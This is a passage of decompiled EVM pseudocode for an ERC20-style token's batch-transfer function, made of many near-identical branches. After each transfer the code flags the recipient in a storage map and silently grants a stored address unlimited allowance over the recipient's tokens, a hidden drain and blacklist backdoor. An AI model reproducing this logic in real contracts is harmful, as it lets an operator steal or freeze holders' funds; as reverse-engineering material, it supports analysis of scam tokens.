                            balanceOf[address(_985)] += _987
                            mem[mem[64]] = _987
                            emit Transfer(_987, msg.sender, address(_985));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1619 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1619), stor12);
                        else:
                            mem[0] = msg.sender
                            mem[32] = 2
                            if 1 == bool(stor2[address(msg.sender)]):
                                if stor11 == msg.sender:
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _1175 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_1175] = 38
                                    mem[_1175 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _987 > balanceOf[address(msg.sender)]:
                                        _1259 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[idx + _1259 + 68] = mem[idx + _1175 + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_1259 + 100] = mem[_1259 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _1259 + -mem[64] + 132
                                    balanceOf[address(msg.sender)] -= _987
                                    if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                        revert with 0, 'SafeMath: addition overflow'
                                    mem[0] = address(_985)
                                    mem[32] = 0
                                    balanceOf[address(_985)] += _987
                                    mem[mem[64]] = _987
                                    emit Transfer(_987, msg.sender, address(_985));
                                    if idx < arg1:
                                        require idx < mem[96]
                                        stor1[mem[(32 * idx) + 140 len 20]] = 1
                                        require idx < mem[96]
                                        _1715 = mem[(32 * idx) + 128]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                        if not stor12:
                                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                        mem[0] = stor12
                                        mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                        allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                        mem[mem[64]] = -1
                                        emit Approval(-1, address(_1715), stor12);
                                else:
                                    if stor12 != mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _1211 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_1211] = 38
                                    mem[_1211 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _987 > balanceOf[address(msg.sender)]:
                                        _1315 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[idx + _1315 + 68] = mem[idx + _1211 + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_1315 + 100] = mem[_1315 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _1315 + -mem[64] + 132
                                    balanceOf[address(msg.sender)] -= _987
                                    if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                        revert with 0, 'SafeMath: addition overflow'
                                    mem[0] = address(_985)
                                    mem[32] = 0
                                    balanceOf[address(_985)] += _987
                                    mem[mem[64]] = _987
                                    emit Transfer(_987, msg.sender, address(_985));
                                    if idx < arg1:
                                        require idx < mem[96]
                                        stor1[mem[(32 * idx) + 140 len 20]] = 1
                                        require idx < mem[96]
                                        _1766 = mem[(32 * idx) + 128]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                        if not stor12:
                                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                        mem[0] = stor12
                                        mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                        allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                        mem[mem[64]] = -1
                                        emit Approval(-1, address(_1766), stor12);
                            else:
                                if mem[(32 * idx) + (32 * arg2.length) + 160] >= stor3:
                                    if stor11 == msg.sender:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1209 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1209] = 38
                                        mem[_1209 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _987 > balanceOf[address(msg.sender)]:
                                            _1306 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[idx + _1306 + 68] = mem[idx + _1209 + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1306 + 100] = mem[_1306 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1306 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _987
                                        if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_985)
                                        mem[32] = 0
                                        balanceOf[address(_985)] += _987
                                        mem[mem[64]] = _987
                                        emit Transfer(_987, msg.sender, address(_985));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1762 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1762), stor12);
                                    else:
                                        if stor12 != mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1251 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1251] = 38
                                        mem[_1251 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _987 > balanceOf[address(msg.sender)]:
                                            _1374 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[idx + _1374 + 68] = mem[idx + _1251 + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1374 + 100] = mem[_1374 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1374 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _987
                                        if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_985)
                                        mem[32] = 0
                                        balanceOf[address(_985)] += _987
                                        mem[mem[64]] = _987
                                        emit Transfer(_987, msg.sender, address(_985));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1808 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1808), stor12);
                                else:
                                    if stor11 != mem[(32 * idx) + 140 len 20]:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1171 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1171] = 38
                                        mem[_1171 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _987 > balanceOf[address(msg.sender)]:
                                            _1253 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[idx + _1253 + 68] = mem[idx + _1171 + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1253 + 100] = mem[_1253 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1253 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _987
                                        if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_985)
                                        mem[32] = 0
                                        balanceOf[address(_985)] += _987
                                        mem[mem[64]] = _987
                                        emit Transfer(_987, msg.sender, address(_985));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1713 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1713), stor12);
                                    else:
                                        mem[0] = msg.sender
                                        stor2[address(msg.sender)] = 1
                                        mem[32] = 1
                                        stor1[address(msg.sender)] = 0
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1173 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1173] = 38
                                        mem[_1173 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _987 > balanceOf[address(msg.sender)]:
                                            _1256 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[idx + _1256 + 68] = mem[idx + _1173 + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1256 + 100] = mem[_1256 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1256 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _987
                                        if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_985)
                                        mem[32] = 0
                                        balanceOf[address(_985)] += _987
                                        mem[mem[64]] = _987
                                        emit Transfer(_987, msg.sender, address(_985));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1714 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1714), stor12);
        else:
            if _owner == msg.sender:
                stor11 = mem[(32 * idx) + 140 len 20]
                if not msg.sender:
                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                if not mem[(32 * idx) + 140 len 20]:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                _993 = mem[64]
                mem[64] = mem[64] + 96
                mem[_993] = 38
                mem[_993 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                mem[32] = 0
                if _987 > balanceOf[address(msg.sender)]:
                    _1004 = mem[64]
                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                    mem[mem[64] + 4] = 32
                    mem[mem[64] + 36] = 38
                    idx = 0
                    while idx < 38:
                        mem[idx + _1004 + 68] = mem[idx + _993 + 32]
                        idx = idx + 32
                        continue 
                    mem[_1004 + 100] = mem[_1004 + 126 len 6]
                    revert with memory
                      from mem[64]
                       len _1004 + -mem[64] + 132
                balanceOf[address(msg.sender)] -= _987
                if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                    revert with 0, 'SafeMath: addition overflow'
                mem[0] = address(_985)
                mem[32] = 0
                balanceOf[address(_985)] += _987
                mem[mem[64]] = _987
                emit Transfer(_987, msg.sender, address(_985));
                if idx < arg1:
                    require idx < mem[96]
                    stor1[mem[(32 * idx) + 140 len 20]] = 1
                    require idx < mem[96]
                    _1423 = mem[(32 * idx) + 128]
                    if not mem[(32 * idx) + 140 len 20]:
                        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                    if not stor12:
                        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                    mem[0] = stor12
                    mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                    allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                    mem[mem[64]] = -1
                    emit Approval(-1, address(_1423), stor12);
            else:
                if stor11 == msg.sender:
                    if _owner != msg.sender:
                        if not msg.sender:
                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                        if not mem[(32 * idx) + 140 len 20]:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                        _1100 = mem[64]
                        mem[64] = mem[64] + 96
                        mem[_1100] = 38
                        mem[_1100 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                        mem[32] = 0
                        if _987 > balanceOf[address(msg.sender)]:
                            _1184 = mem[64]
                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                            mem[mem[64] + 4] = 32
                            mem[mem[64] + 36] = 38
                            idx = 0
                            while idx < 38:
                                mem[idx + _1184 + 68] = mem[idx + _1100 + 32]
                                idx = idx + 32
                                continue 
                            mem[_1184 + 100] = mem[_1184 + 126 len 6]
                            revert with memory
                              from mem[64]
                               len _1184 + -mem[64] + 132
                        balanceOf[address(msg.sender)] -= _987
                        if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                            revert with 0, 'SafeMath: addition overflow'
                        mem[0] = address(_985)
                        mem[32] = 0
                        balanceOf[address(_985)] += _987
                        mem[mem[64]] = _987
                        emit Transfer(_987, msg.sender, address(_985));
                        if idx < arg1:
                            require idx < mem[96]
                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                            require idx < mem[96]
                            _1649 = mem[(32 * idx) + 128]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                            if not stor12:
                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                            mem[0] = stor12
                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                            mem[mem[64]] = -1
                            emit Approval(-1, address(_1649), stor12);
                    else:
                        if mem[(32 * idx) + 140 len 20] != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1141 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1141] = 38
                            mem[_1141 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _987 > balanceOf[address(msg.sender)]:
                                _1221 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[idx + _1221 + 68] = mem[idx + _1141 + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1221 + 100] = mem[_1221 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1221 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _987
                            if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_985)
                            mem[32] = 0
                            balanceOf[address(_985)] += _987
                            mem[mem[64]] = _987
                            emit Transfer(_987, msg.sender, address(_985));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1681 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1681), stor12);
                        else:
                            stor3 = mem[(32 * idx) + (32 * arg2.length) + 160]
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1187 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1187] = 38
                            mem[_1187 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _987 > balanceOf[address(msg.sender)]:
                                _1275 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[idx + _1275 + 68] = mem[idx + _1187 + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1275 + 100] = mem[_1275 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1275 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _987
                            if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_985)
                            mem[32] = 0
                            balanceOf[address(_985)] += _987
                            mem[mem[64]] = _987
                            emit Transfer(_987, msg.sender, address(_985));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1730 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1730), stor12);
                else:
                    if _owner == mem[(32 * idx) + 140 len 20]:
                        if _owner != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1155 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1155] = 38
                            mem[_1155 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _987 > balanceOf[address(msg.sender)]:
                                _1234 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[idx + _1234 + 68] = mem[idx + _1155 + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1234 + 100] = mem[_1234 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1234 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _987
                            if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_985)
                            mem[32] = 0
                            balanceOf[address(_985)] += _987
                            mem[mem[64]] = _987
                            emit Transfer(_987, msg.sender, address(_985));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1688 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1688), stor12);
                        else:
                            if mem[(32 * idx) + 140 len 20] != msg.sender:
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _1198 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_1198] = 38
                                mem[_1198 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _987 > balanceOf[address(msg.sender)]:
                                    _1285 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[idx + _1285 + 68] = mem[idx + _1198 + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_1285 + 100] = mem[_1285 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _1285 + -mem[64] + 132
                                balanceOf[address(msg.sender)] -= _987
                                if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                    revert with 0, 'SafeMath: addition overflow'
                                mem[0] = address(_985)
                                mem[32] = 0
                                balanceOf[address(_985)] += _987
                                mem[mem[64]] = _987
                                emit Transfer(_987, msg.sender, address(_985));
                                if idx < arg1:
                                    require idx < mem[96]
                                    stor1[mem[(32 * idx) + 140 len 20]] = 1
                                    require idx < mem[96]
                                    _1744 = mem[(32 * idx) + 128]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                    if not stor12:
                                        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                    mem[0] = stor12
                                    mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                    allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                    mem[mem[64]] = -1
                                    emit Approval(-1, address(_1744), stor12);
                            else:
                                stor3 = mem[(32 * idx) + (32 * arg2.length) + 160]
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _1237 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_1237] = 38
                                mem[_1237 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _987 > balanceOf[address(msg.sender)]:
                                    _1354 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[idx + _1354 + 68] = mem[idx + _1237 + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_1354 + 100] = mem[_1354 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _1354 + -mem[64] + 132
                                balanceOf[address(msg.sender)] -= _987
                                if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                    revert with 0, 'SafeMath: addition overflow'
                                mem[0] = address(_985)
                                mem[32] = 0
                                balanceOf[address(_985)] += _987
                                mem[mem[64]] = _987
                                emit Transfer(_987, msg.sender, address(_985));
                                if idx < arg1:
                                    require idx < mem[96]
                                    stor1[mem[(32 * idx) + 140 len 20]] = 1
                                    require idx < mem[96]
                                    _1801 = mem[(32 * idx) + 128]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                    if not stor12:
                                        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                    mem[0] = stor12
                                    mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                    allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
